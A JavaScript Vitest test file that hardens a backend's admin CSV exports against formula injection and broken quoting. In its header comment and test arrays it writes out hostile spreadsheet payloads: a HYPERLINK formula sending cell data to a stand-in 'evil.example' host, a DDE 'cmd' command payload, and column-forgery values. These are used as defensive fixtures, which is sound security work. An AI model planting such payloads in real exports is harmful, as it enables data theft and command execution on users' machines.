/**
 * §21 — CSV export: quoting AND formula neutralisation.
 * §22 — hardened after the Astra consult; see the "WHAT CHANGED IN §22" block.
 *
 * WHY THIS TEST EXISTS
 * --------------------
 * Four admin-reachable CSV exports had grown independently and each was broken
 * differently:
 *
 *   controllers/adminClientController.mjs  — correct RFC 4180 quoter, but no
 *                                            formula guard (and it was PRIVATE)
 *   routes/admin/adminFinanceRoutes.mjs    — raw interpolation, no quoting at all
 *   routes/adminOrdersRoutes.mjs           — quotes added, embedded quotes not
 *                                            doubled, so a name with `"` breaks out
 *   routes/sessionRoutes.mjs               — 3 fields quoted-without-doubling,
 *                                            3 fields not quoted at all
 *
 * None neutralised a leading `=`, `+`, `-`, `@`, TAB or CR. A client named
 * `=HYPERLINK("https://evil.example?d="&A1,"View invoice")` therefore arrives in
 * the admin's spreadsheet as a **live link**, and `=cmd|'/c calc'!A0` is the DDE
 * variant. Quoting correctly does nothing about this: `=1+1` contains no character
 * that triggers quoting, so it passes through a perfect RFC 4180 quoter untouched.
 *
 * WHAT CHANGED IN §22 — five defects an independent seat found in the §21 guards
 * ----------------------------------------------------------------------------
 * D2  The comment stripper was `s.replace(/\/\/.*$/gm, ' ')` — a trailing-comment
 *     rule with no quote tracking. The `//` inside `https://` therefore started a
 *     "comment" and DELETED THE REST OF THE LINE, including a real `setHeader`
 *     call. Fixed by dropping trailing comments entirely and stripping only
 *     full-line `//` and `/* *\/` blocks, tracking no quote state (skill §24:
 *     a quote-tracking scanner is desynced by a regex literal; over-stripping is
 *     the dangerous direction). Control tests for BOTH directions are below.
 *     The emission marker was also broadened: `res.type('csv')` and `setHeader (`
 *     with a space were invisible to it.
 * D1  The "no hand-rolled quoting" rule worked on LINES, so unrelated text on the
 *     same line suppressed it:
 *       const row = `"${value}"`; serializeCsv([], []);               // was ignored
 *       const row = `"${value}"`; const l = 'Content-Disposition';    // was ignored
 *     and concatenation (`'"' + v + '"'`) never matched at all. Now the unit is
 *     the TEMPLATE LITERAL and the test is on the INTERPOLATION EXPRESSION, so
 *     neither trick works. A concatenation rule was added.
 * D1c The import assertion was a bare `toMatch` on raw source, so a COMMENT
 *     satisfied it. It now requires a real `import … from '…csvEscape.mjs'`
 *     statement anchored at line start.
 * D7  The one-escaper rule is a name list and always will be — it is renamed to
 *     say so, and an output-level test now carries the weight instead.
 *
 * SCOPE IS DERIVED, NOT LISTED. The set of files checked is computed from the
 * emission marker rather than a hand-written list — §20's finding was that a guard
 * scoped to the author's own file list cannot find the file the author forgot. The
 * derivation is now paired with NAMED FIXTURES, because a derived set that quietly
 * shrinks is the other way this fails.
 *
 * CRLF: sources normalised before matching.
 */
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { resolve, join, dirname, relative, extname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, it, expect } from 'vitest';

import { escapeCsvValue, serializeCsv } from '../../utils/csvEscape.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));
// `SSPT_GUARD_ROOT` lets the mutation harness (tests/mutation/) point this guard
// at a throwaway copy of the tree, so a mutation is applied to a COPY and never
// to the real source. Same contract as emailHtmlInjectionGuard.test.mjs:42-44.
//
// Without it this guard could not be mutation-tested at all (§22.10, O-13): the
// harness is single-guard by construction and the only alternative would be
// mutating the working tree, which is the one thing the harness exists to avoid.
const BACKEND = process.env.SSPT_GUARD_ROOT
  ? resolve(process.env.SSPT_GUARD_ROOT)
  : resolve(__dirname, '../..');

const read = (rel) => readFileSync(resolve(BACKEND, rel), 'utf8').replace(/\r\n/g, '\n');

/**
 * Blank out comments WITHOUT tracking quote state.
 *
 * Full-line `//` and `/* … *\/` only. Trailing `//` is deliberately NOT stripped:
 * a `//`-to-EOL rule deletes the real code in `x = 'a//b'; res.setHeader(...)` on
 * one line, and over-stripping is the dangerous direction — a false negative is an
 * unfired control while a false positive is a visible annoyance.
 *
 * Length and line structure are preserved (same-length whitespace), so a reported
 * line number is the real line number.
 */
const stripComments = (source) => source
  .replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, ' '))
  .replace(/^[ \t]*\/\/.*$/gm, (m) => ' '.repeat(m.length));

/**
 * Directories that are NOT this project's source.
 *
 * `venv` / `.venv` are load-bearing and were added in §22.9. The backend vendors
 * two Python virtualenvs — `flask_server/venv` and `services/form-analysis/venv` —
 * and the walk descended into both. Neither contains an `.mjs` today, so excluding
 * them changes NOTHING right now; the control test below is what makes that a
 * proven no-op rather than an assumption.
 *
 * Why it still matters: without the exclusion the walk traverses third-party trees,
 * and the first dependency to ship an `.mjs` would have this guard reporting on code
 * nobody here owns. A guard that flags code you cannot edit gets deleted — which is
 * the exact failure mode the rest of this file is written to avoid.
 */
const SKIP = new Set(['node_modules', 'dist', 'coverage', '.git', '.mutation-tmp', 'venv', '.venv']);
/**
 * May the walk descend into this directory?
 *
 * Extracted from `walkSource` so the DECISION is testable on its own, rather
 * than only observable through whatever the tree happens to contain. Pinning the
 * state ("no walked path has a dot segment") cannot catch a revert to
 * `SKIP.has(e)` while no dot-directory holds an `.mjs` — which is exactly today's
 * situation, so that assertion is necessary but not sufficient. This is the
 * sufficient half.
 *
 * Dot-directories are never first-party source. `SKIP` alone was not enough: it
 * lists only the dot-directories someone thought of, and it had already missed
 * two that exist — `.fallow` (the `code-health` analyzer's own cache) and
 * `.understand-anything`. Reproduced rather than argued: a hand-rolled emitter
 * planted at `backend/.d16-demo-dotdir/offender.mjs` was reported by this guard
 * as a PRODUCTION offender. A throwaway tree left by a probe of this review
 * created that condition for real, and it stayed harmless only because the probe
 * planted copies of code that was already clean.
 *
 * The email guard already carried this rule; the two walks disagreed, and this
 * was the one that was wrong.
 */
const shouldDescend = (name) => !SKIP.has(name) && !name.startsWith('.');

function walkSource() {
  const out = [];
  (function visit(dir) {
    for (const e of readdirSync(dir)) {
      const p = join(dir, e);
      let st; try { st = statSync(p); } catch { continue; }
      if (st.isDirectory()) { if (shouldDescend(e)) visit(p); continue; }
      if (extname(e) === '.mjs') out.push(p);
    }
  })(BACKEND);
  return out;
}
const SOURCES = walkSource().map((p) => ({
  rel: relative(BACKEND, p).split('\\').join('/'),
  code: readFileSync(p, 'utf8').replace(/\r\n/g, '\n'),
}));

const SHARED_MODULE = 'utils/csvEscape.mjs';

/**
 * Paths that are NOT shipped production code, and so are not export sites.
 *
 * §20's lesson was that a hand-written scope is too NARROW — it cannot find the
 * file the author forgot. §22's derivation fixed that by deriving the scope from
 * the emission marker, and immediately exposed the MIRROR-IMAGE failure: the
 * marker is textual, so a file that merely QUOTES it in a fixture looks like an
 * emitter. This is not hypothetical. The first run of this file derived
 * `tests/unit/csvInjectionGuard.test.mjs` as an emitter, because its own fixtures
 * contain `setHeader('Content-Type', 'text/csv')` — the guard flagged itself.
 *
 * The exemption is therefore explicit, and it is BOUNDED BY A CONTROL TEST below
 * so that its width cannot change unnoticed. Over-broad exclusion is the
 * dangerous direction: it silently removes files from the check while the suite
 * stays green.
 *
 * Matches the test-tree conventions actually present in this repo — `tests/`,
 * `test/` and `__tests__/`, at any depth. A name that merely CONTAINS "test"
 * (`services/latests.mjs`, `services/attest/x.mjs`) is NOT a test path.
 */
const TEST_PATH = /(?:^|\/)(?:tests?|__tests__)\//;
const isProduction = (rel) => !TEST_PATH.test(rel);

/**
 * A file that actually SENDS csv — not one that merely mentions the mime type.
 * Broadened in §22: the previous pattern required `setHeader(` with no space and
 * missed `res.type('csv')` entirely.
 */
const CSV_EMIT_RE = new RegExp([
  String.raw`setHeader\s*\(\s*['"]Content-Type['"]\s*,\s*['"]text\/csv`,
  String.raw`\.type\s*\(\s*['"](?:csv|text\/csv)['"]\s*\)`,
  String.raw`\.attachment\s*\(\s*['"][^'"]*\.csv['"]`,
].join('|'));

/** The emitters §21 fixed by name. The derivation must still find every one. */
const NAMED_EMITTERS = [
  'controllers/adminClientController.mjs',
  'routes/admin/adminFinanceRoutes.mjs',
  'routes/adminOrdersRoutes.mjs',
  'routes/sessionRoutes.mjs',
];

/**
 * Template literals in a source file, with each interpolation expression and the
 * LITERAL text (interpolations removed).
 *
 * The literal text is what distinguishes a hand-rolled CSV cell wrapper — its
 * literal text is nothing but quote characters — from an unrelated template in
 * the same module such as `LIKE '%${term}%'` or `filename="${name}"`.
 *
 * Braces are balanced when scanning an interpolation, so `fn({ a: 1 })` is one
 * expression. Nested template literals inside an interpolation are consumed as
 * part of that interpolation. This is a scanner, not a parser: it can be fooled by
 * a backtick inside a string inside an interpolation. It is used only to decide
 * which expressions to look at, and the failure direction is a missed site, which
 * is why the output-level test below carries the weight.
 */
function templateLiterals(code) {
  const out = [];
  let i = 0;
  while (i < code.length) {
    if (code[i] !== '`') { i += 1; continue; }
    const line = code.slice(0, i).split('\n').length;
    let j = i + 1;
    const exprs = [];
    let lit = '';
    while (j < code.length) {
      const c = code[j];
      if (c === '\\') { lit += code.slice(j, j + 2); j += 2; continue; }
      if (c === '`') break;
      if (c === '$' && code[j + 1] === '{') {
        let k = j + 2;
        let braces = 1;
        while (k < code.length && braces > 0) {
          const d = code[k];
          if (d === '\\') { k += 2; continue; }
          if (d === '{') braces += 1;
          else if (d === '}') braces -= 1;
          k += 1;
        }
        exprs.push({ text: code.slice(j + 2, k - 1), line: code.slice(0, j).split('\n').length });
        j = k;
        continue;
      }
      lit += c;
      j += 1;
    }
    out.push({ lit, exprs, line });
    i = j + 1;
  }
  return out;
}

describe('§21 — the shared CSV escaper behaves', () => {
  it('neutralises every formula trigger on a string value', () => {
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\t=1', '\r=1']) {
      expect(escapeCsvValue(payload), `not neutralised: ${payload}`).toContain("'");
      expect(escapeCsvValue(payload).replace(/^"/, '')[0], `must not lead with the trigger: ${payload}`)
        .not.toBe('=');
    }
    expect(escapeCsvValue('=1+1')).toBe("'=1+1");
    expect(escapeCsvValue('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralises a trigger hidden behind leading whitespace', () => {
    // Parsers differ, but Google Sheets, LibreOffice and Excel's text-import
    // wizard all trim before deciding whether a cell is a formula — so
    // ' =1+1' is as live as '=1+1'. The original pattern was anchored at the
    // first character only, so every payload below passed through untouched
    // while the escaper's own comment claimed leading whitespace was handled.
    for (const payload of [' =1+1', '  @SUM(A1)', '\t\t+1', ' \t-r', '\n=1']) {
      const out = escapeCsvValue(payload);
      expect(
        out.replace(/^"/, ''),
        `not neutralised: ${JSON.stringify(payload)} -> ${JSON.stringify(out)}`,
      ).toMatch(/^'/);
    }
    // Whitespace alone is not a formula, and must not be mangled.
    expect(escapeCsvValue('   ')).toBe('   ');
    expect(escapeCsvValue('Sean Swan')).toBe('Sean Swan');
  });

  it('does NOT prefix a real number, so numeric columns survive', () => {
    // A negative number legitimately starts with '-'. Turning -5 into '-5 would
    // corrupt every numeric cell in a finance export — a false positive that
    // would get the guard deleted.
    expect(escapeCsvValue(-5)).toBe('-5');
    expect(escapeCsvValue(-5.25)).toBe('-5.25');
    expect(escapeCsvValue(0)).toBe('0');
    // ...but a STRING that looks numeric is user input, and is neutralised.
    expect(escapeCsvValue('-5')).toBe("'-5");
  });

  it('neutralises the classic DDE payload and still quotes it correctly', () => {
    const out = escapeCsvValue('=cmd|"/c calc"!A0');
    expect(out).toMatch(/^"'=/);        // quoted, then apostrophe, then =
    expect(out).toContain('""');        // the embedded quotes are doubled
  });

  it('quotes per RFC 4180', () => {
    expect(escapeCsvValue('a,b')).toBe('"a,b"');
    expect(escapeCsvValue('a"b')).toBe('"a""b"');
    expect(escapeCsvValue('a\nb')).toBe('"a\nb"');
    expect(escapeCsvValue('a\rb')).toBe('"a\rb"');
    expect(escapeCsvValue('plain')).toBe('plain');
  });

  it('renders null/undefined as empty, not as the text "null"', () => {
    expect(escapeCsvValue(null)).toBe('');
    expect(escapeCsvValue(undefined)).toBe('');
  });

  it('serializeCsv separates records with CRLF', () => {
    // Not "CRLF-terminated" — the final record carries no trailing CRLF. §22 D6
    // caught the comment overstating this; the assertion is on the real bytes.
    expect(serializeCsv(['a', 'b'], [['1', '2']])).toBe('a,b\r\n1,2');
    expect(serializeCsv(['a'], [['1'], ['2']])).toBe('a\r\n1\r\n2');
  });
});

describe('§22 D2 — the comment stripper is robust in both directions', () => {
  // The prescribed controls from the hostile-review-sweep skill §24. A stripper
  // whose tests only cover the case you just fixed has not been tested.

  it('control: a URL containing // does not start a comment', () => {
    const src = "const u = 'https://example.invalid'; res.setHeader('Content-Type', 'text/csv');";
    expect(CSV_EMIT_RE.test(stripComments(src)), 'the real call after the URL must survive').toBe(true);
  });

  it('control: a full-line // comment IS removed', () => {
    const src = "// res.setHeader('Content-Type', 'text/csv');\nconst x = 1;";
    expect(CSV_EMIT_RE.test(stripComments(src))).toBe(false);
  });

  it('control: a block comment IS removed, and keeps its line count', () => {
    const src = "/*\n res.setHeader('Content-Type', 'text/csv');\n*/\nconst x = 1;";
    const out = stripComments(src);
    expect(CSV_EMIT_RE.test(out)).toBe(false);
    expect(out.split('\n').length).toBe(src.split('\n').length);
  });

  it('control: over-stripping does NOT delete real code after a trailing //', () => {
    // The dangerous direction. A trailing-comment rule would delete the setHeader.
    const src = "const s = 'a//b'; res.setHeader('Content-Type', 'text/csv');";
    expect(CSV_EMIT_RE.test(stripComments(src)), 'the call after a trailing // must survive').toBe(true);
  });

  it('control: stripping preserves line numbers', () => {
    const src = "// one\n// two\nconst x = 1;\n/* a\n b */\nconst y = 2;";
    const out = stripComments(src);
    expect(out.split('\n').length).toBe(src.split('\n').length);
    expect(out.split('\n').findIndex((l) => l.includes('const y'))).toBe(5);
  });
});

describe('§22 D2 — the emission marker sees every supported form', () => {
  it('recognises the header form, spaced or not', () => {
    expect(CSV_EMIT_RE.test("res.setHeader('Content-Type', 'text/csv')")).toBe(true);
    expect(CSV_EMIT_RE.test("res.setHeader ('Content-Type', 'text/csv')")).toBe(true);
    expect(CSV_EMIT_RE.test('res.setHeader("Content-Type", "text/csv")')).toBe(true);
  });

  it('recognises the res.type() form', () => {
    expect(CSV_EMIT_RE.test("res.type('csv').send(body)")).toBe(true);
    expect(CSV_EMIT_RE.test("res.type('text/csv').send(body)")).toBe(true);
  });

  it('recognises the attachment form', () => {
    expect(CSV_EMIT_RE.test("res.attachment('clients.csv')")).toBe(true);
  });

  it('does NOT match an upload MIME allowlist that merely lists text/csv', () => {
    // 'text/plain', 'text/csv' as accepted upload types is not an export.
    expect(CSV_EMIT_RE.test("const ALLOWED = ['text/plain', 'text/csv'];")).toBe(false);
  });
});

describe('§22 D7 — there is no private CSV escaper (a name list, and named as one)', () => {
  // HONEST COVERAGE. This matches SEVEN KNOWN IDENTIFIERS and cannot prove
  // repository-wide uniqueness: a private escaper called `wrapCell`, `toCell`,
  // `csvSafe`, `q` or `quoteField` is invisible to it. §22 D7 is exactly that
  // criticism, and the fix is to stop claiming more than the rule does — the
  // output-level test below is what actually constrains the behaviour.
  it('no file outside the shared module declares one of the known escaper names', () => {
    const KNOWN_ESCAPER_NAMES =
      /(?:^|\n)\s*(?:export\s+)?(?:const|let|var|function)\s+(escapeCsvValue|escapeCsv|escapeCsvField|csvEscape|toCsvValue|sanitizeCsvValue|csvCell)\b\s*[=(]/;
    const offenders = [];
    for (const { rel, code } of SOURCES) {
      if (rel === SHARED_MODULE) continue;
      if (KNOWN_ESCAPER_NAMES.test(stripComments(code))) offenders.push(rel);
    }
    expect(offenders).toEqual([]);
  });

  it('the shared serializer neutralises every hostile cell an export can carry', () => {
    // The output-level check. This is the assertion that does not care how a cell
    // was built, so it is the one that cannot be evaded by a statement form.
    const HOSTILE = [
      '=HYPERLINK("https://evil.example?d="&A1,"View invoice")',
      "=cmd|'/c calc'!A0",
      '=1+1', '+1', '-1', '@SUM(A1)', ' =1+1', '\t=1', '\n=1',
      'a,b', 'a"b', 'a\nb', 'a\rb', '","',
    ];
    const body = serializeCsv(['value'], HOSTILE.map((v) => [v]));
    const records = body.split('\r\n').slice(1);
    expect(records.length).toBe(HOSTILE.length);

    for (let i = 0; i < records.length; i += 1) {
      const rec = records[i];
      // Strip one layer of RFC 4180 quoting, then require that the cell does not
      // begin with a formula trigger.
      const unquoted = rec.startsWith('"') && rec.endsWith('"') ? rec.slice(1, -1).replace(/""/g, '"') : rec;
      expect(
        unquoted,
        `cell ${JSON.stringify(HOSTILE[i])} serialised to ${JSON.stringify(rec)} — it can still be read as a formula`,
      ).not.toMatch(/^[\s]*[=+\-@\t\r]/);
    }
  });

  it('a value that forges a later column cannot escape its cell', () => {
    // `","` is the classic column-forgery payload: unescaped it splits one cell
    // into three and invents two columns.
    const body = serializeCsv(['name', 'role'], [['","', 'client']]);
    const record = body.split('\r\n')[1];
    // The forged separator must be inside quotes and its own quotes doubled.
    expect(record.startsWith('"')).toBe(true);
    expect(record).toContain('""');
    // Parsing the record back must yield exactly two cells.
    const cells = [];
    let cur = '';
    let inQ = false;
    for (let i = 0; i < record.length; i += 1) {
      const c = record[i];
      if (c === '"' && inQ && record[i + 1] === '"') { cur += '"'; i += 1; continue; }
      if (c === '"') { inQ = !inQ; continue; }
      if (c === ',' && !inQ) { cells.push(cur); cur = ''; continue; }
      cur += c;
    }
    cells.push(cur);
    expect(cells).toEqual(['","', 'client']);
  });
});

describe('§21 — every CSV-emitting file uses the shared escaper', () => {
  const EMITTERS = SOURCES
    .filter(({ rel }) => isProduction(rel))
    .filter(({ code }) => CSV_EMIT_RE.test(stripComments(code)))
    .map(({ rel }) => rel);

  it('control: the test-path exemption is bounded and does not over-reach', () => {
    // Excluded: every test-tree convention present in this repo.
    expect(isProduction('tests/unit/x.test.mjs')).toBe(false);
    expect(isProduction('tests/mutation/x.mjs')).toBe(false);
    expect(isProduction('test/x.mjs')).toBe(false);
    expect(isProduction('__tests__/x.test.mjs')).toBe(false);
    // NOT excluded: a name that merely CONTAINS "test". If the predicate were
    // `rel.includes('tests')` these would be silently dropped from the check.
    expect(isProduction('services/latests.mjs')).toBe(true);
    expect(isProduction('services/attest/x.mjs')).toBe(true);
    expect(isProduction('routes/adminOrdersRoutes.mjs')).toBe(true);
    // The four files §21 fixed by name are production paths, so the exemption
    // can never be the reason one of them stops being checked.
    for (const known of NAMED_EMITTERS) {
      expect(isProduction(known), `${known} must be treated as production`).toBe(true);
    }
  });

  it('control: the guard file itself is not derived as an emitter', () => {
    // Regression pin for the exact self-flagging failure described above.
    expect(EMITTERS).not.toContain('tests/unit/csvInjectionGuard.test.mjs');
  });

  it('control: the walk does not descend into a vendored virtualenv', () => {
    // §22.9. The backend vendors two Python virtualenvs; before this, the walk
    // descended into both. That was harmless only because neither ships an `.mjs`,
    // so the exclusion is a provable no-op today — and this test is what keeps it
    // provable, rather than something a future reader has to re-derive.
    expect(SOURCES.length).toBeGreaterThan(100);
    expect(
      SOURCES.filter(({ rel }) => /(^|\/)(venv|\.venv)\//.test(rel)).map(({ rel }) => rel),
    ).toEqual([]);
    // Pin the set entries themselves: a rename back to `['node_modules', ...]`
    // would leave the assertion above passing on a tree that happens to have no
    // venv, which is not the property being claimed.
    expect(SKIP.has('venv')).toBe(true);
    expect(SKIP.has('.venv')).toBe(true);
  });

  it('control: the walk does not descend into any dot-directory', () => {
    // §22.11. `SKIP` is a hand-written list, so it can only exclude the
    // dot-directories someone remembered. Measured before the fix: two dot-dirs
    // inside `backend/` were being walked — `.fallow` (the `code-health`
    // analyzer's own cache) and `.understand-anything` — each holding 0 `.mjs`,
    // which is exactly why nothing ever looked wrong.
    //
    // The mechanism was reproduced rather than inferred: a hand-rolled emitter
    // planted at `backend/.d16-demo-dotdir/offender.mjs` was reported by this
    // guard as a PRODUCTION offender, because `.d16-demo-dotdir` is not in SKIP.
    // A throwaway tree left by a probe of this review created that condition for
    // real; it stayed harmless only because the probe planted copies of code that
    // was already clean.
    expect(
      SOURCES.filter(({ rel }) => rel.split('/').some((seg) => seg.startsWith('.')))
        .map(({ rel }) => rel),
    ).toEqual([]);

    // Non-vacuity. Without this, the assertion above also passes on a tree that
    // has no dot-directories at all — it would be reporting the absence of
    // something to exclude, not the working of the rule.
    const dotDirs = readdirSync(BACKEND, { withFileTypes: true })
      .filter((e) => e.isDirectory() && e.name.startsWith('.'))
      .map((e) => e.name);
    expect(
      dotDirs.length,
      `no dot-directories in backend/ — this control is vacuous (found: ${dotDirs.join(', ')})`,
    ).toBeGreaterThan(0);

    // The DECISION itself — the half that actually holds.
    //
    // The two assertions above are necessary but NOT sufficient: both would still
    // pass after a revert to `SKIP.has(e)`, because no dot-directory in this tree
    // currently contains an `.mjs` for the walk to pick up. These do not depend on
    // the tree at all, so a revert fails here immediately.
    expect(shouldDescend('.fallow')).toBe(false);
    expect(shouldDescend('.understand-anything')).toBe(false);
    expect(shouldDescend('.d16-demo-dotdir')).toBe(false);
    expect(shouldDescend('.mutation-tmp')).toBe(false);
    expect(shouldDescend('.git')).toBe(false);
    expect(shouldDescend('node_modules')).toBe(false);
    expect(shouldDescend('venv')).toBe(false);
    // Must not over-reach: a name that merely CONTAINS a dot is still source, and
    // `tests/` must still be walked (the exemption that matters there is
    // `isProduction`, not the walk).
    expect(shouldDescend('routes')).toBe(true);
    expect(shouldDescend('services')).toBe(true);
    expect(shouldDescend('v1.2')).toBe(true);
    expect(shouldDescend('tests')).toBe(true);
  });

  it('the derived scope still contains every emitter fixed by name', () => {
    // A derived set that quietly shrinks passes while scanning nothing. The old
    // `length >= 4` bound could not detect a missed emitter; naming them can.
    expect(EMITTERS.length).toBeGreaterThanOrEqual(NAMED_EMITTERS.length);
    for (const known of NAMED_EMITTERS) {
      expect(EMITTERS, `${known} is no longer recognised as a CSV emitter`).toContain(known);
    }
  });

  for (const rel of NAMED_EMITTERS) {
    it(`${rel} imports the shared escaper in a real import statement`, () => {
      // Anchored at line start: a bare toMatch on raw source was satisfied by a
      // COMMENT mentioning the path (§22 D1c).
      expect(
        stripComments(read(rel)),
        `${rel} emits CSV but has no import of csvEscape.mjs`,
      ).toMatch(/^[ \t]*import[\s\S]{0,400}?from\s+['"][^'"]*csvEscape\.mjs['"]/m);
    });
  }

  it('no emitter hand-rolls quotes around a cell — checked per template, not per line', () => {
    // §22 D1. The previous rule worked on LINES, so any unrelated mention of
    // `serializeCsv` or `Content-Disposition` on the same line suppressed it:
    //   const row = `"${value}"`; serializeCsv([], []);        // was ignored
    // and concatenation never matched at all.
    //
    // The unit is now the TEMPLATE LITERAL. An intermediate draft of this §22
    // rule went further and treated EVERY template in an emitter module as a
    // candidate, which produced ~60 false positives on SQL fragments
    // (`LIKE '%${search}%'`), email bodies and log lines in the same files — the
    // same too-wide-scope error in the opposite direction. §20's lesson cuts both
    // ways, so the discriminator is stated rather than assumed:
    //
    //   A hand-rolled CSV cell/row wrapper is a template whose LITERAL text is
    //   nothing but quote characters, separators, whitespace and line escapes.
    //
    //     `"${v}"`            lit = `""`                    -> pure   -> flagged
    //     `"${a}","${b}"`     lit = `","`                   -> pure   -> flagged
    //     `"${v}"\r\n`        lit = `""\r\n`                -> pure   -> flagged
    //     `attachment; filename="${f}"`   lit = `attachment; filename=""`  -> impure
    //     `LIKE '%${s}%'`     lit = `LIKE '%%'`             -> impure
    //     `${a} ${b}`         lit = ` `                     -> no quote at all
    //
    // KNOWN LIMIT: a wrapper with extra literal text (`name: "${v}"`) is not
    // flagged. Such a template is not a CSV cell in the first place, so the miss
    // is acceptable — and the output-level test below is what actually constrains
    // the behaviour.
    const ESCAPED = /(escapeCsvValue|serializeCsv)/;
    // Quote chars, commas, whitespace, and any backslash escape (`\r`, `\n`, `\t`).
    const NOT_A_WRAPPER_CHAR = /["',\s]|\\[\s\S]/g;
    const offenders = [];

    for (const rel of EMITTERS) {
      for (const tpl of templateLiterals(stripComments(read(rel)))) {
        if (tpl.exprs.length === 0) continue;
        if (!/["']/.test(tpl.lit)) continue;                      // no quote in the literal text
        if (tpl.lit.replace(NOT_A_WRAPPER_CHAR, '').length > 0) continue;  // not a bare wrapper
        for (const expr of tpl.exprs) {
          if (ESCAPED.test(expr.text)) continue;
          offenders.push(`${rel}:${expr.line}  \${${expr.text.trim().slice(0, 80)}}`);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it('no emitter hand-rolls quotes by concatenation', () => {
    // §22 D1: `'"' + v + '"'` never matched the interpolation shape.
    //
    // The target is a ONE-CHARACTER quote string used as a cell delimiter:
    // `'"'`, `"'"`, and the backtick variants `` `"` `` and `` `'` ``. It is
    // written as a backreference so that `'""'` — a TWO-character string of
    // quotes, which is not a hand-rolled wrapper — does not match. The previous
    // `/["']{3}/` did match it, which is how this rule came to flag this file's
    // own assertions on the first run. Narrowing here is sharpening, not
    // weakening: the real defect form below is what the control in §22 exercises.
    //
    // The old form of this rule skipped any line containing `escapeCsvValue` or
    // `serializeCsv`. That was the SAME same-line suppression §22 D1 identified in
    // the template rule, and it protected nothing: the only occurrence of the
    // quote idiom anywhere in the four emitters is inside a comment
    // (routes/adminOrdersRoutes.mjs:856), which stripComments already removes. The
    // exemption is gone, so `x.map(escapeCsvValue).join('","')` is now caught —
    // it was invisible before.
    const CONCAT_QUOTE = /(['"`])(?:'|")\1/;
    const JOIN_QUOTE = /\.join\s*\(\s*['"][^'"]*["'][^'"]*["'][^'"]*['"]\s*\)/;
    const offenders = [];
    for (const rel of EMITTERS) {
      stripComments(read(rel)).split('\n').forEach((ln, i) => {
        if (!CONCAT_QUOTE.test(ln) && !JOIN_QUOTE.test(ln)) return;
        offenders.push(`${rel}:${i + 1}  ${ln.trim().slice(0, 110)}`);
      });
    }
    expect(offenders).toEqual([]);
  });
});
